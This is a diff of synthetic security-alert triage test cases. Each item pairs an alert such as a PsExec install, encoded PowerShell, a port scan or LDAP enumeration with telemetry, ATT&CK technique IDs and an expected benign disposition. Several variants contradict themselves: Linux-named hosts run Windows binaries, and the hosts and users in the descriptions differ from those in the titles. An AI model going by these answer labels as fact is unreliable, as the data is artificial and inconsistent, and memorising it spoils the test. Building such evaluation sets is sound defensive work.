+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1566.001",
+    "T1059.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-LEG-03",
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "CommandLine": "cmd.exe /c \"C:\\Legal\\merge-templates.bat\"",
+     "User": "EXAMPLE\\r.devlin"
+    },
+    {
+     "source": "vcs",
+     "note": "merge-templates.bat is a reviewed document-assembly macro deployed to the legal OU in 2021."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-001-R1",
+   "provenance": "synthetic",
+   "title": "PsExec service installed on WIN-ENG-17",
+   "description": "psexesvc.exe installed and started on WIN-DB-07 by svc-patching@example.com at 02:14 local. Source host WIN-MGMT-01.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1569.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "PsExec service installed on WIN-ENG-17",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-ENG-17",
+     "Image": "C:\\Windows\\PSEXESVC.exe",
+     "User": "EXAMPLE\\svc-patching",
+     "ParentImage": "C:\\Windows\\System32\\services.exe",
+     "UtcTime": "2026-03-04T02:14:11Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041455",
+     "window_start": "2026-03-04T02:00:00Z",
+     "window_end": "2026-03-04T04:00:00Z",
+     "approver": "platform-oncall@example.com",
+     "summary": "Quarterly database patch rollout, wave 3"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-001-R2",
+   "provenance": "synthetic",
+   "title": "PsExec service installed on LIN-APP-05",
+   "description": "psexesvc.exe installed and started on WIN-DB-07 by svc-patching@example.com at 02:14 local. Source host WIN-MGMT-01.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1569.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "PsExec service installed on LIN-APP-05",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "LIN-APP-05",
+     "Image": "C:\\Windows\\PSEXESVC.exe",
+     "User": "EXAMPLE\\svc-patching",
+     "ParentImage": "C:\\Windows\\System32\\services.exe",
+     "UtcTime": "2026-03-04T02:14:11Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041487",
+     "window_start": "2026-03-04T02:00:00Z",
+     "window_end": "2026-03-04T04:00:00Z",
+     "approver": "platform-oncall@example.com",
+     "summary": "Quarterly database patch rollout, wave 3"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-001-R3",
+   "provenance": "synthetic",
+   "title": "PsExec service installed on WIN-HR-08",
+   "description": "psexesvc.exe installed and started on WIN-DB-07 by svc-patching@example.com at 02:14 local. Source host WIN-MGMT-01.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1569.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "PsExec service installed on WIN-HR-08",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-HR-08",
+     "Image": "C:\\Windows\\PSEXESVC.exe",
+     "User": "EXAMPLE\\svc-patching",
+     "ParentImage": "C:\\Windows\\System32\\services.exe",
+     "UtcTime": "2026-03-04T02:14:11Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041502",
+     "window_start": "2026-03-04T02:00:00Z",
+     "window_end": "2026-03-04T04:00:00Z",
+     "approver": "platform-oncall@example.com",
+     "summary": "Quarterly database patch rollout, wave 3"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-001-R4",
+   "provenance": "synthetic",
+   "title": "PsExec service installed on LIN-DATA-11",
+   "description": "psexesvc.exe installed and started on WIN-DB-07 by svc-patching@example.com at 02:14 local. Source host WIN-MGMT-01.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1569.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "PsExec service installed on LIN-DATA-11",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "LIN-DATA-11",
+     "Image": "C:\\Windows\\PSEXESVC.exe",
+     "User": "EXAMPLE\\svc-patching",
+     "ParentImage": "C:\\Windows\\System32\\services.exe",
+     "UtcTime": "2026-03-04T02:14:11Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041533",
+     "window_start": "2026-03-04T02:00:00Z",
+     "window_end": "2026-03-04T04:00:00Z",
+     "approver": "platform-oncall@example.com",
+     "summary": "Quarterly database patch rollout, wave 3"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-002-R1",
+   "provenance": "synthetic",
+   "title": "Encoded PowerShell from build agent LIN-CI-04",
+   "description": "powershell.exe -EncodedCommand observed on WIN-BUILD-02, parent process the Jenkins agent service.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1059.001",
+    "T1027"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Encoded PowerShell from build agent LIN-CI-04",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-OPS-22",
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "CommandLine": "powershell.exe -NoProfile -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQA",
+     "ParentImage": "C:\\Program Files\\Jenkins\\jenkins-agent.exe",
+     "User": "EXAMPLE\\svc-jenkins"
+    },
+    {
+     "source": "vcs",
+     "repository": "example/platform-deploy",
+     "file": "scripts/deploy.ps1",
+     "note": "Encoding is how the pipeline passes a multi-line script through the agent."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-002-R2",
+   "provenance": "synthetic",
+   "title": "Encoded PowerShell from build agent LIN-CI-04",
+   "description": "powershell.exe -EncodedCommand observed on WIN-BUILD-02, parent process the Jenkins agent service.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1059.001",
+    "T1027"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Encoded PowerShell from build agent LIN-CI-04",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "LIN-EDGE-02",
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "CommandLine": "powershell.exe -NoProfile -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQA",
+     "ParentImage": "C:\\Program Files\\Jenkins\\jenkins-agent.exe",
+     "User": "EXAMPLE\\svc-jenkins"
+    },
+    {
+     "source": "vcs",
+     "repository": "example/platform-deploy",
+     "file": "scripts/deploy.ps1",
+     "note": "Encoding is how the pipeline passes a multi-line script through the agent."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-002-R3",
+   "provenance": "synthetic",
+   "title": "Encoded PowerShell from build agent LIN-CI-04",
+   "description": "powershell.exe -EncodedCommand observed on WIN-BUILD-02, parent process the Jenkins agent service.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1059.001",
+    "T1027"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Encoded PowerShell from build agent LIN-CI-04",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-LEG-14",
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "CommandLine": "powershell.exe -NoProfile -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQA",
+     "ParentImage": "C:\\Program Files\\Jenkins\\jenkins-agent.exe",
+     "User": "EXAMPLE\\svc-jenkins"
+    },
+    {
+     "source": "vcs",
+     "repository": "example/platform-deploy",
+     "file": "scripts/deploy.ps1",
+     "note": "Encoding is how the pipeline passes a multi-line script through the agent."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-002-R4",
+   "provenance": "synthetic",
+   "title": "Encoded PowerShell from build agent LIN-CI-04",
+   "description": "powershell.exe -EncodedCommand observed on WIN-BUILD-02, parent process the Jenkins agent service.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1059.001",
+    "T1027"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Encoded PowerShell from build agent LIN-CI-04",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "LIN-CI-09",
+     "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "CommandLine": "powershell.exe -NoProfile -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQA",
+     "ParentImage": "C:\\Program Files\\Jenkins\\jenkins-agent.exe",
+     "User": "EXAMPLE\\svc-jenkins"
+    },
+    {
+     "source": "vcs",
+     "repository": "example/platform-deploy",
+     "file": "scripts/deploy.ps1",
+     "note": "Encoding is how the pipeline passes a multi-line script through the agent."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-003-R1",
+   "provenance": "synthetic",
+   "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+   "description": "Sequential TCP connections to 1,024 ports across 2,300 hosts in eleven minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1046"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_ip": "198.51.100.40",
+     "distinct_dst": 2300,
+     "distinct_ports": 1024,
+     "duration_seconds": 660
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.40",
+     "hostname": "vulnscan-prod-01.example.com",
+     "owner": "security-engineering@example.com",
+     "role": "authenticated vulnerability scanner",
+     "scan_schedule": "weekly, Sundays 01:00-05:00 UTC"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-003-R2",
+   "provenance": "synthetic",
+   "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+   "description": "Sequential TCP connections to 1,024 ports across 2,300 hosts in eleven minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1046"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_ip": "198.51.100.40",
+     "distinct_dst": 2300,
+     "distinct_ports": 1024,
+     "duration_seconds": 660
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.40",
+     "hostname": "vulnscan-prod-01.example.com",
+     "owner": "security-engineering@example.com",
+     "role": "authenticated vulnerability scanner",
+     "scan_schedule": "weekly, Sundays 01:00-05:00 UTC"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-003-R3",
+   "provenance": "synthetic",
+   "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+   "description": "Sequential TCP connections to 1,024 ports across 2,300 hosts in eleven minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1046"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_ip": "198.51.100.40",
+     "distinct_dst": 2300,
+     "distinct_ports": 1024,
+     "duration_seconds": 660
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.40",
+     "hostname": "vulnscan-prod-01.example.com",
+     "owner": "security-engineering@example.com",
+     "role": "authenticated vulnerability scanner",
+     "scan_schedule": "weekly, Sundays 01:00-05:00 UTC"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-003-R4",
+   "provenance": "synthetic",
+   "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+   "description": "Sequential TCP connections to 1,024 ports across 2,300 hosts in eleven minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1046"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Port scan across 10.0.0.0/8 from 198.51.100.40",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_ip": "198.51.100.40",
+     "distinct_dst": 2300,
+     "distinct_ports": 1024,
+     "duration_seconds": 660
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.40",
+     "hostname": "vulnscan-prod-01.example.com",
+     "owner": "security-engineering@example.com",
+     "role": "authenticated vulnerability scanner",
+     "scan_schedule": "weekly, Sundays 01:00-05:00 UTC"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-004-R1",
+   "provenance": "synthetic",
+   "title": "Mass file read by backup agent on FS-CORP-02",
+   "description": "48,000 file reads in 20 minutes by a single process on the corporate file server.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1005",
+    "T1074.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Mass file read by backup agent on FS-CORP-02",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "WIN-HR-08",
+     "Image": "C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe",
+     "User": "EXAMPLE\\svc-backup",
+     "files_touched": 48000,
+     "window_minutes": 20
+    },
+    {
+     "source": "edr",
+     "process_signed": true,
+     "signer": "Veeam Software Group GmbH",
+     "network_destinations": [
+      "198.51.100.70"
+     ]
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-004-R2",
+   "provenance": "synthetic",
+   "title": "Mass file read by backup agent on FS-CORP-02",
+   "description": "48,000 file reads in 20 minutes by a single process on the corporate file server.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1005",
+    "T1074.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Mass file read by backup agent on FS-CORP-02",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "LIN-DATA-11",
+     "Image": "C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe",
+     "User": "EXAMPLE\\svc-backup",
+     "files_touched": 48000,
+     "window_minutes": 20
+    },
+    {
+     "source": "edr",
+     "process_signed": true,
+     "signer": "Veeam Software Group GmbH",
+     "network_destinations": [
+      "198.51.100.70"
+     ]
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-004-R3",
+   "provenance": "synthetic",
+   "title": "Mass file read by backup agent on FS-CORP-02",
+   "description": "48,000 file reads in 20 minutes by a single process on the corporate file server.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1005",
+    "T1074.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Mass file read by backup agent on FS-CORP-02",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "WIN-OPS-22",
+     "Image": "C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe",
+     "User": "EXAMPLE\\svc-backup",
+     "files_touched": 48000,
+     "window_minutes": 20
+    },
+    {
+     "source": "edr",
+     "process_signed": true,
+     "signer": "Veeam Software Group GmbH",
+     "network_destinations": [
+      "198.51.100.70"
+     ]
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-004-R4",
+   "provenance": "synthetic",
+   "title": "Mass file read by backup agent on FS-CORP-02",
+   "description": "48,000 file reads in 20 minutes by a single process on the corporate file server.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1005",
+    "T1074.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Mass file read by backup agent on FS-CORP-02",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "LIN-EDGE-02",
+     "Image": "C:\\Program Files\\Veeam\\Backup\\VeeamAgent.exe",
+     "User": "EXAMPLE\\svc-backup",
+     "files_touched": 48000,
+     "window_minutes": 20
+    },
+    {
+     "source": "edr",
+     "process_signed": true,
+     "signer": "Veeam Software Group GmbH",
+     "network_destinations": [
+      "198.51.100.70"
+     ]
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-005-R1",
+   "provenance": "synthetic",
+   "title": "LDAP enumeration from WIN-LEG-14",
+   "description": "12,400 LDAP queries enumerating users, groups and group membership in six minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1087.002",
+    "T1069.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "LDAP enumeration from WIN-LEG-14",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4662,
+     "Computer": "WIN-LEG-14",
+     "SubjectUserName": "svc-scim-sync",
+     "query_count": 12400,
+     "window_minutes": 6
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "LIN-IAM-SYNC01",
+     "role": "SCIM provisioning connector",
+     "runs_every": "15 minutes"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-005-R2",
+   "provenance": "synthetic",
+   "title": "LDAP enumeration from LIN-CI-09",
+   "description": "12,400 LDAP queries enumerating users, groups and group membership in six minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1087.002",
+    "T1069.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "LDAP enumeration from LIN-CI-09",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4662,
+     "Computer": "LIN-CI-09",
+     "SubjectUserName": "svc-scim-sync",
+     "query_count": 12400,
+     "window_minutes": 6
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "LIN-IAM-SYNC01",
+     "role": "SCIM provisioning connector",
+     "runs_every": "15 minutes"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-005-R3",
+   "provenance": "synthetic",
+   "title": "LDAP enumeration from WIN-DB-31",
+   "description": "12,400 LDAP queries enumerating users, groups and group membership in six minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1087.002",
+    "T1069.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "LDAP enumeration from WIN-DB-31",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4662,
+     "Computer": "WIN-DB-31",
+     "SubjectUserName": "svc-scim-sync",
+     "query_count": 12400,
+     "window_minutes": 6
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "LIN-IAM-SYNC01",
+     "role": "SCIM provisioning connector",
+     "runs_every": "15 minutes"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-005-R4",
+   "provenance": "synthetic",
+   "title": "LDAP enumeration from WIN-FIN-03",
+   "description": "12,400 LDAP queries enumerating users, groups and group membership in six minutes.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1087.002",
+    "T1069.002"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "LDAP enumeration from WIN-FIN-03",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4662,
+     "Computer": "WIN-FIN-03",
+     "SubjectUserName": "svc-scim-sync",
+     "query_count": 12400,
+     "window_minutes": 6
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "LIN-IAM-SYNC01",
+     "role": "SCIM provisioning connector",
+     "runs_every": "15 minutes"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-006-R1",
+   "provenance": "synthetic",
+   "title": "Impossible travel for j.okafor@example.com",
+   "description": "Sign-in from London then Singapore 40 minutes apart.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1078.004"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Impossible travel for j.okafor@example.com",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "p.lindqvist@example.com",
+     "client_ip": "198.51.100.12",
+     "geo": "London, GB",
+     "ts": "2026-03-04T08:02:00Z"
+    },
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "p.lindqvist@example.com",
+     "client_ip": "203.0.113.88",
+     "geo": "Singapore, SG",
+     "ts": "2026-03-04T08:42:00Z"
+    },
+    {
+     "source": "network",
+     "ip": "203.0.113.88",
+     "note": "Corporate egress gateway, APAC region. Traffic egresses here when the VPN reconnects."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-006-R2",
+   "provenance": "synthetic",
+   "title": "Impossible travel for j.okafor@example.com",
+   "description": "Sign-in from London then Singapore 40 minutes apart.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1078.004"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Impossible travel for j.okafor@example.com",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "s.oyelaran@example.com",
+     "client_ip": "198.51.100.12",
+     "geo": "London, GB",
+     "ts": "2026-03-04T08:02:00Z"
+    },
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "s.oyelaran@example.com",
+     "client_ip": "203.0.113.88",
+     "geo": "Singapore, SG",
+     "ts": "2026-03-04T08:42:00Z"
+    },
+    {
+     "source": "network",
+     "ip": "203.0.113.88",
+     "note": "Corporate egress gateway, APAC region. Traffic egresses here when the VPN reconnects."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-006-R3",
+   "provenance": "synthetic",
+   "title": "Impossible travel for j.okafor@example.com",
+   "description": "Sign-in from London then Singapore 40 minutes apart.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1078.004"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Impossible travel for j.okafor@example.com",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "d.moreau@example.com",
+     "client_ip": "198.51.100.12",
+     "geo": "London, GB",
+     "ts": "2026-03-04T08:02:00Z"
+    },
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "d.moreau@example.com",
+     "client_ip": "203.0.113.88",
+     "geo": "Singapore, SG",
+     "ts": "2026-03-04T08:42:00Z"
+    },
+    {
+     "source": "network",
+     "ip": "203.0.113.88",
+     "note": "Corporate egress gateway, APAC region. Traffic egresses here when the VPN reconnects."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-006-R4",
+   "provenance": "synthetic",
+   "title": "Impossible travel for j.okafor@example.com",
+   "description": "Sign-in from London then Singapore 40 minutes apart.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1078.004"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Impossible travel for j.okafor@example.com",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "k.bhattacharya@example.com",
+     "client_ip": "198.51.100.12",
+     "geo": "London, GB",
+     "ts": "2026-03-04T08:02:00Z"
+    },
+    {
+     "source": "okta",
+     "eventType": "user.session.start",
+     "actor": "k.bhattacharya@example.com",
+     "client_ip": "203.0.113.88",
+     "geo": "Singapore, SG",
+     "ts": "2026-03-04T08:42:00Z"
+    },
+    {
+     "source": "network",
+     "ip": "203.0.113.88",
+     "note": "Corporate egress gateway, APAC region. Traffic egresses here when the VPN reconnects."
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-007-R1",
+   "provenance": "synthetic",
+   "title": "New privileged account created: svc-terraform-runner",
+   "description": "Account created and added to Domain Admins outside business hours.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1136.002",
+    "T1098"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "New privileged account created: svc-terraform-runner",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4720,
+     "Computer": "WIN-OPS-22",
+     "TargetUserName": "svc-terraform-runner",
+     "SubjectUserName": "svc-provisioning",
+     "ts": "2026-03-04T23:40:00Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041487",
+     "approver": "iam-lead@example.com",
+     "summary": "Provision infrastructure-automation service account, approved at CAB 2026-02-27"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-007-R2",
+   "provenance": "synthetic",
+   "title": "New privileged account created: svc-terraform-runner",
+   "description": "Account created and added to Domain Admins outside business hours.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1136.002",
+    "T1098"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "New privileged account created: svc-terraform-runner",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4720,
+     "Computer": "LIN-EDGE-02",
+     "TargetUserName": "svc-terraform-runner",
+     "SubjectUserName": "svc-provisioning",
+     "ts": "2026-03-04T23:40:00Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041502",
+     "approver": "iam-lead@example.com",
+     "summary": "Provision infrastructure-automation service account, approved at CAB 2026-02-27"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-007-R3",
+   "provenance": "synthetic",
+   "title": "New privileged account created: svc-terraform-runner",
+   "description": "Account created and added to Domain Admins outside business hours.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1136.002",
+    "T1098"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "New privileged account created: svc-terraform-runner",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4720,
+     "Computer": "WIN-LEG-14",
+     "TargetUserName": "svc-terraform-runner",
+     "SubjectUserName": "svc-provisioning",
+     "ts": "2026-03-04T23:40:00Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041533",
+     "approver": "iam-lead@example.com",
+     "summary": "Provision infrastructure-automation service account, approved at CAB 2026-02-27"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-007-R4",
+   "provenance": "synthetic",
+   "title": "New privileged account created: svc-terraform-runner",
+   "description": "Account created and added to Domain Admins outside business hours.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1136.002",
+    "T1098"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "New privileged account created: svc-terraform-runner",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4720,
+     "Computer": "LIN-CI-09",
+     "TargetUserName": "svc-terraform-runner",
+     "SubjectUserName": "svc-provisioning",
+     "ts": "2026-03-04T23:40:00Z"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041420",
+     "approver": "iam-lead@example.com",
+     "summary": "Provision infrastructure-automation service account, approved at CAB 2026-02-27"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-008-R1",
+   "provenance": "synthetic",
+   "title": "Bulk outbound email from 198.51.100.55",
+   "description": "22,000 messages to external recipients in one hour.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1114.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Bulk outbound email from 198.51.100.55",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "m365_audit",
+     "Operation": "Send",
+     "sender": "campaigns@example.com",
+     "message_count": 22000,
+     "window_minutes": 60
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.55",
+     "hostname": "mkt-sendgrid-relay.example.com",
+     "role": "marketing email relay"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-008-R2",
+   "provenance": "synthetic",
+   "title": "Bulk outbound email from 198.51.100.55",
+   "description": "22,000 messages to external recipients in one hour.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1114.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Bulk outbound email from 198.51.100.55",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "m365_audit",
+     "Operation": "Send",
+     "sender": "campaigns@example.com",
+     "message_count": 22000,
+     "window_minutes": 60
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.55",
+     "hostname": "mkt-sendgrid-relay.example.com",
+     "role": "marketing email relay"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-008-R3",
+   "provenance": "synthetic",
+   "title": "Bulk outbound email from 198.51.100.55",
+   "description": "22,000 messages to external recipients in one hour.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1114.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Bulk outbound email from 198.51.100.55",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "m365_audit",
